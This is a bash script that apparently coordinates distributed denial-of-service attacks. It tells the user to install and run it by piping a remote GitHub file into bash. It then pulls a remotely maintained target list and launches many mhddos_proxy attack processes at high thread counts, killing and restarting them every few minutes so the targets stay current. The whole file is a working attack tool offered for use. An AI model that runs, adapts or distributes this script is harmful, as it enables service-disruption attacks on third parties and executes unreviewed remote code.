#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.



## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
## By default (9m), can be passed as second parameter
restart_interval="9m"


#parameters that passed to python scrypt
threads="${1:-1000}"
threads="-t $threads"
rpc="${2:-200}"
rpc="--rpc $rpc"
debug="${3:-}"
proxy_interval="-p 600"

#Just in case kill previous copy of mhddos_proxy
pkill -f runner.py
pkill -f ./start.py



# Restart attacks and update targets list every 10 minutes (by default)
while [[ 1 == 1 ]]
#echo -e "#####################################\n"
do
   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   
   echo -e "\nNumber of targets in list: $list_size \n"

   
      
   # Launch multiple mhddos_proxy instances with different targets.
   for (( i=1; i<=list_size; i++ ))
   do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
           

            echo "full cmd:"
            echo "$cmd_line $proxy_interval $threads $rpc"
            
            cd ~/mhddos_proxy
            python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
            echo -e "Attack started. Wait a few minutes for output"
   done
   
   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
   sleep $restart_interval
   clear
   echo -e "\nRESTARTING\nKilling old processes..."
   pkill -f runner.py
   pkill -f ./start.py
   echo -e "\nOld processes have been killed - starting new ones"
done
